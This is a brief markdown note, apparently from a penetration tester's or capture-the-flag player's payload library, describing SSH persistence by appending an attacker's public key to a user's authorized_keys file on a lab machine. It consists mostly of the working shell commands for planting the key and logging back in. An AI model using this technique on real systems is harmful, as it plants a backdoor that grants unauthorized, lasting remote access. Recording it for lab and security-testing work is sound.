# SSH `authorized_keys` Persistence

Drop an attacker public key into a writable user's `~/.ssh/authorized_keys` to regain shell access through SSH.

Used on: **coldvvars**

## Commands

<!-- cmd: linux -->
```bash
echo "ssh-rsa AAAAB3N..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
ssh marston@$TARGET
```

## Notes

- Use a placeholder for the public key in reusable notes unless the exact captured key is intentionally part of the lab evidence.
- This belongs in payloads/persistence because it is reusable shell material, not a standalone exploit.

